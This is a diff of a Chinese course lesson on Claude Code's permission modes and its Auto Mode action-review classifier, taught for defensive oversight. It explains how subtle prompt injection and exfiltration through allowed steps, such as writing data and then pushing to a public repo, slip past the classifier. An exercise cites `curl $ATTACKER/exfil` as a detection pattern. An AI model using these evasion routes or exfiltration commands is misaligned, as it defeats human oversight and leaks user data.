@@ -1,114 +1,112 @@
-# 作为 Autonomous Agent 的 Claude Code：权限模式与 Auto Mode
+# 自主 Agent 的权限模式
 
-> Claude Code 暴露了七种权限模式。"plan" 会在每个动作前询问，"default" 只会对有风险的动作询问，"acceptEdits" 会自动批准文件写入，但仍会确认 shell 执行，"bypassPermissions" 会批准一切。Auto Mode（2026 年 3 月 24 日）用两阶段并行 safety classifier 取代逐动作批准：每个动作都会运行 single-token 快速检查；被标记的动作会启动 chain-of-thought 深度审查。动作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。Auto Mode 以 research preview 形式发布——Anthropic 已明确表示，classifier 单独使用并不足够。
+> 权限阶梯是一组渐进式自主级别，从“审查每项操作”到“批准所有操作”，harness 通过它来管理自主 Agent 无需询问即可执行的操作。作为本课完整示例的 Claude Code 提供六种此类模式：“plan”会在每项操作前询问；“default”（在 UI 中标记为“Manual”）只会针对高风险操作询问；“acceptEdits”会自动批准文件写入，但仍会要求确认 shell 执行；“bypassPermissions”则会批准一切。Auto Mode，即 `auto` 权限模式，会使用一个独立的 classifier Model 取代逐项操作审批；该 Model 会在每项操作运行前进行审查，并阻止任何超出请求范围的权限升级。操作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。`auto` 是否可用取决于套餐、组织是否启用、Model 和提供商；Anthropic 也明确指出，classifier 本身并不足够。
 
-**类型：** 学习
-**语言：** Python（stdlib，两阶段 classifier simulator）
-**先修要求：** Phase 15 · 01（Long-horizon agents），Phase 15 · 09（Coding-agent landscape）
-**时间：** 约 45 分钟
+**Type:** Learn
+**Languages:** Python (stdlib, two-stage classifier simulator)
+**Prerequisites:** Phase 15 · 01（长周期 Agent），Phase 15 · 09（Coding Agent 全景）
+**Time:** ~45 分钟
 
 ## 问题
 
-你机器上的 autonomous coding agent 是一个独立的安全类别。攻击面就是该 agent 能够触达的一切——file system、network、credentials、clipboard、任何 browser tab、任何打开的 terminal。Bruce Schneier 等人已经公开指出这一点：computer-use agents 不是 chatbots 的一次“功能更新”，而是一种新的工具，具有一种新的风险画像。
+运行在你机器上的自主 Coding Agent 属于一个独立的安全类别。攻击面包括 Agent 能够访问的一切：文件系统、网络、凭据、剪贴板、任何浏览器标签页以及任何已打开的终端。Bruce Schneier 等人已经公开指出：computer-use Agent 并不是聊天机器人的一次“Feature 更新”，而是一种拥有全新风险特征的新型 Tool。
 
-Claude Code 的权限系统是 Anthropic 给出的答案。它不是一个“autonomous / not autonomous”开关，而是七种模式组成的能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每种模式都在速度与逐动作审查之间做出不同取舍。Auto Mode（2026 年 3 月）加入了一个两阶段 classifier：对于 classifier 判断为安全的动作，它把批准流程移出用户的关键路径，同时为 classifier 标记的动作保留审查层。
+Claude Code 的权限系统是 Anthropic 给出的答案。它并未提供单一的“自主/非自主”开关，而是提供了横跨能力阶梯的六种模式：plan → default → acceptEdits → … → bypassPermissions。每种模式都代表速度与逐项操作审查之间的不同权衡。Auto Mode（2026 年 3 月）增加了一个独立的 classifier Model，将审批移出用户的关键路径：它会在每项操作运行前进行审查，并阻止任何超出请求范围的权限升级。
 
-工程问题是：这个系统能捕捉什么、会漏掉什么，以及某个给定任务到底应该使用哪种模式？
+Engineering 问题是：这个系统能捕获什么、会漏掉什么，以及一项给定任务实际上适合哪种模式？
 
 ## 概念
 
-### 七种权限模式
+### 六种权限模式
 
-| 模式 | 行为 | 使用场景 |
+| 模式 | 行为 | 适用场景 |
 |---|---|---|
-| `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都会被审查 | 不熟悉的任务；接近 prod 的代码；第一次在某个 repo 上使用 agent |
-| `default` | Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
-| `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍然提示 | 跨很多文件的 refactoring pass |
-| `acceptExec` | shell commands 在经过整理的 allowlist 内自动批准；写入自动批准 | 紧密 inner loops，其中每个 shell command 都是 `npm test` 或类似命令 |
-| `autoMode` | 两阶段 safety classifier；被标记的动作提升为审查 | 受限 workspace 中的 long-horizon unattended runs |
-| `yolo` | 跳过大多数提示；仍然运行 tool allowlist / denylist | 临时 sandboxes、CI jobs、research scripts |
-| `bypassPermissions` | 批准一切 | 文档说明为“只在你愿意丢弃的 ephemeral containers 内使用” |
+| `plan` | Agent 提出计划；用户批准完整计划；每项操作都在执行前接受审查 | 不熟悉的任务；接近生产环境的代码；首次在某个 Repo 上使用 Agent |
+| `default` | 在 UI 中标记为“Manual”。Agent 执行操作；遇到任何“高风险”操作（shell 执行、破坏性操作、网络调用）时提示用户 | 大多数交互式 Coding 会话 |
+| `acceptEdits` | 自动批准文件写入；shell 执行和网络调用仍会提示 | 跨多个文件的重构过程 |
+| `auto` | 一个独立的 classifier Model 会在每项操作运行前进行审查；阻止任何超出请求范围的权限升级 | 受约束工作区中的长周期无人值守运行 |
+| `dontAsk` | 从不提示；权限规则未预先批准的操作会被拒绝 | 临时 sandbox、CI Job、研究脚本 |
+| `bypassPermissions` | 批准一切 | 文档说明其“仅适用于你愿意直接丢弃的临时容器” |
 
-（上面的名称与公开 Claude Code docs 一致；"yolo" 是对 permissive middle ground 的非正式简称。）
+（以上名称与 Claude Code 公开文档一致；UI 将 `default` 标记为“Manual”。）
 
-### 一页理解 Auto Mode
+### 一页了解 Auto Mode
 
-Auto Mode（2026 年 3 月 24 日发布）是第一个把逐动作批准委托给 model 的权限模式。结构如下：
+Auto Mode（发布于 2026 年 3 月 24 日）是首个将逐项操作审批委托给 Model 的权限模式。其结构如下：
 
-1. **Stage 1 — single-token classifier。** 在每个拟议动作上运行。成本低。返回 "safe" 或 "flag"。设计为与主 agent loop 并行运行，因此已批准的动作不会停在队列里。
-2. **Stage 2 — secondary policy/safety review。** 只在被标记的动作上运行。围绕该动作、session 当前状态和声明任务执行聚焦的 policy 与 safety assessment。如果置信度低，则升级到用户 HITL。
+1. **一个独立的 classifier Model。** 它会在每项拟议操作运行前进行审查，并根据已声明的任务和会话当前状态作出判断，阻止任何超出请求范围的权限升级。被阻止的操作会回退给用户处理。
+2. **受限的可用性。** 是否提供 `auto` 取决于套餐、组织是否启用、Model 和提供商。
 
-预算控制与 classifier 并列存在：
+预算控制与 classifier 配合使用：
 
-- `max_turns` — 一个 session 中的总迭代次数。
-- `max_budget_usd` — 触发 session 中止的美元上限。
-- 每个 tool 的动作次数限制（例如不超过 N 次 `WebFetch` calls）。
+- `max_turns` — 会话中的总迭代次数。
+- `max_budget_usd` — 触发会话中止的美元支出上限。
+- 每个 Tool 的操作次数限制（例如 `WebFetch` 调用不得超过 N 次）。
 
-### 系统能捕捉什么
+### 系统能够捕获什么
 
-- tool inputs 中直接的 prompt injection，其中注入指令映射到已知有风险的动作形态。
-- 重复 tool loops——classifier 可以看到 action N+1 与 action N 连续五次几乎相同。
-- 在本应只编辑文件的 session 中，明显越界的 shell commands。
+- Tool 输入中直接的 Prompt injection，且注入指令对应一种已知的高风险操作模式。
+- 重复的 Tool 循环，即 classifier 可以看到操作 N+1 与操作 N 几乎完全相同，并连续出现了五次。
+- 在原本仅限文件编辑的会话中，明显超出范围的 shell 命令。
 
 ### 系统可能漏掉什么
 
-- **微妙的 prompt injection**，它会调制行为，但不会产生单个被标记的动作。Indirect prompt injection 不是一个完全可修补的漏洞（OpenAI preparedness head，2025，关于 browser agents——见 Lesson 11）。
-- **语义层面的不当行为。** 每个单独动作看起来都可能安全，但组合起来的 trajectory 是有害的。classifier 判断的是动作；它不会重新推导用户意图。
-- **通过合法渠道 exfiltration。** 将数据写入你拥有的文件，然后 `git push` 到 public repo，是一串允许动作，但问题在于它们的组合。
+- **隐蔽的 Prompt injection**：它会调节行为，却不会产生任何一项被标记的操作。间接 Prompt injection 并不是可以彻底修补的漏洞（OpenAI preparedness 负责人，2025 年，针对浏览器 Agent 的观点，参见 Lesson 11）。
+- **语义层面的不当行为。** 每项单独操作看起来都可能是安全的，但组合后的轨迹却是有害的。classifier 判断的是操作；它不会重新推导用户意图。
+- **通过合法渠道外泄。** 先将数据写入你拥有的文件，再通过 `git push` 推送到公开 Repo，这是一系列各自被允许、但组合起来存在问题的操作。
 
 ### Research preview 定位
 
-Anthropic 将 Auto Mode 作为 research preview 发布。文档明确说明，classifier 是一层防护，而不是完整解决方案：用户应当将 Auto Mode 与 budgets、allowlists、isolated workspaces 和 trajectory audits（Lessons 12–16）结合使用。preview 定位也反映了已记录的 evaluation-vs-deployment gap（Lesson 1）——一个通过 offline evals 的 classifier，在真实 session 中可能表现不同，因为用户上下文是模糊的。
+Anthropic 以 Research preview 的形式发布 Auto Mode。文档明确指出，classifier 是一道防护层，而不是完整解决方案：用户应将 Auto Mode 与预算、allowlist、隔离工作区和轨迹审计结合使用（Lessons 12–16）。Research preview 的定位也反映了文档所述的 Evaluation 与部署之间的差距（Lesson 1）：通过离线 Evaluation 的 classifier，在用户 Context 含糊不清的真实会话中可能表现不同。
 
-### 这条阶梯在你的 workflow 中的位置
+### 这套阶梯如何融入你的工作流
 
-- 不熟悉的任务：从 `plan` 开始。阅读计划比回滚一次糟糕运行更便宜。
-- 已知 refactor：`acceptEdits` 能省下大量确认点击。
-- unattended background run：只在你已经测量过 blast radius 的 workspace 内使用 `autoMode`（没有 credentials、没有 production mounts、没有你未主动选择的 egress）。
-- Ephemeral containers：当且仅当 container 及其 credentials 都是可丢弃的，`yolo` / `bypassPermissions` 才可接受。
-
+- 不熟悉的任务：从 `plan` 开始。阅读计划的成本低于回滚一次糟糕的运行。
+- 已知重构：`acceptEdits` 可以省去大量确认点击。
+- 无人值守的后台运行：仅在已经评估过影响范围的工作区中使用 `auto`，其中不应包含凭据、生产环境挂载，也不应存在未经你主动允许的出站访问。
+- 临时容器：当且仅当容器及其中的凭据均可丢弃时，才适合使用 `dontAsk` / `bypassPermissions`。
 
 ```figure
 autonomy-oversight
 ```
 
-## 使用它
+## 实际使用
 
-`code/main.py` 模拟两阶段 classifier。Stage 1 是针对拟议动作的廉价 keyword rule；Stage 2 是更慢的 multi-rule reviewer。driver 输入一段简短的 synthetic trajectory（safe actions、一次 prompt-injection attempt、一个 repetitive loop），并展示 classifier 在哪里捕捉到问题、又在哪里漏掉问题。
+`code/main.py` 将操作审查 classifier 模拟为一个两阶段 pipeline。这是为了教学而做的简化；真实的 `auto` 模式由独立的 classifier Model 支持，并不是一个已有文档规定的两阶段契约。Stage 1 对拟议操作执行成本较低的关键词规则；Stage 2 是速度较慢的多规则审查器。driver 会输入一段简短的合成轨迹（安全操作、一次 Prompt injection 尝试和一个重复循环），并展示 classifier 能捕获什么、会漏掉什么。
 
-## 交付它
+## 交付成果
 
-`outputs/skill-permission-mode-picker.md` 会把任务描述匹配到正确的权限模式、预算上限和所需隔离。
+`outputs/skill-permission-mode-picker.md` 会根据任务描述匹配合适的权限模式、预算上限和必要的隔离措施。
 
 ## 练习
 
-1. 运行 `code/main.py`。哪种 synthetic action type 从不被 Stage 1 标记，但总是被 Stage 2 捕捉？哪一种两者都捕捉不到？
+1. 运行 `code/main.py`。哪一种合成操作类型从不会被 Stage 1 标记，却总是会被 Stage 2 捕获？哪一种不会被二者中的任何一个捕获？
 
-2. 扩展 Stage 1 rule set，以捕捉某个特定的 known-bad shape（例如 `curl $ATTACKER/exfil`）。在 benign-action sample 上测量 false-positive rate。
+2. 扩展 Stage 1 规则集，使其能够捕获一种具体的已知恶意模式（例如 `curl $ATTACKER/exfil`）。在良性操作样本上测量误报率。
 
-3. 阅读 Anthropic 的 "How the agent loop works" 文档。列出 agent 在 `default` 模式下默认触碰的每一种 external state。在 unattended 运行 `autoMode` 前，哪些需要单独加 gate？
+3. 阅读 Anthropic 的“How the agent loop works”文档。列出 Agent 在 `default` 模式下默认会接触的所有外部状态。在无人值守运行 `auto` 之前，哪些状态需要单独设置 gate？
 
-4. 设计一个 24 小时 unattended run budget：`max_turns`、`max_budget_usd`、per-tool caps、allowlists。说明每个数字的理由。
+4. 设计一套用于 24 小时无人值守运行的预算：`max_turns`、`max_budget_usd`、每个 Tool 的上限和 allowlist。说明每个数值的理由。
 
-5. 描述一个 trajectory：其中每个单独动作都被 Stage 1 和 Stage 2 批准，但组合行为却是 misaligned。（Lesson 14 会介绍 kill switches 和 canary tokens 如何处理这个问题。）
+5. 描述一条轨迹，其中每项单独操作都获得 classifier 批准，但组合后的行为却没有对齐目标。（Lesson 14 将介绍 kill switch 和 canary Token 如何解决这一问题。）
 
 ## 关键术语
 
-| 术语 | 人们常说 | 实际含义 |
+| 术语 | 人们常说 | 它的实际含义 |
 |---|---|---|
-| 权限模式 | “agent 能做多少事” | 控制逐动作批准的七种命名 policy 之一 |
-| plan mode | “做任何事前都询问” | Agent 编写计划；用户在执行前批准 |
-| acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍然提示 |
-| autoMode | “自动批准” | 两阶段 safety classifier；被标记的动作会升级 |
-| bypassPermissions | “Full YOLO” | 批准一切；预期用于 ephemeral containers |
-| Stage 1 classifier | “Fast token check” | 针对拟议动作的 single-token rule；并行运行 |
-| Stage 2 classifier | “Deep review” | 对被标记动作进行 chain-of-thought reasoning |
-| Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能所使用的定位 |
+| 权限模式 | “Agent 能做多少事” | 控制逐项操作审批的六种命名策略之一 |
+| plan 模式 | “做任何事前都先询问” | Agent 编写计划；用户批准后才执行 |
+| acceptEdits | “让它写文件” | 自动批准文件写入；shell 执行仍会提示 |
+| auto | “自动审批” | 独立的 classifier Model 审查每项操作；阻止超出请求范围的权限升级 |
+| bypassPermissions | “完全 YOLO” | 批准一切；适用于临时容器 |
+| Stage 1（模拟器） | “快速关键词检查” | `code/main.py` 中针对拟议操作执行的低成本规则 |
+| Stage 2（模拟器） | “深度审查” | `code/main.py` 中用于审查被标记操作、速度较慢的多规则审查器 |
+| Research preview | “尚未 GA” | Anthropic 对故障模式仍在探索中的 Feature 所采用的定位 |
 
 ## 延伸阅读
 
-- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — 权限模式、budgets、action format。
-- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — managed-service 执行模型。
-- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — feature surface 与 Auto Mode announcement。
-- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 塑造 classifier 判断的 reason-based layer。
-- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — 关于 long-horizon permission design 的内部视角。
+- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — 权限模式、预算和操作格式。
+- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — 托管服务执行 Model。
+- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — Feature 范围和 Auto Mode 公告。
+- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 塑造 classifier 判断的基于理由的防护层。
+- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — 关于长周期权限设计的内部视角。
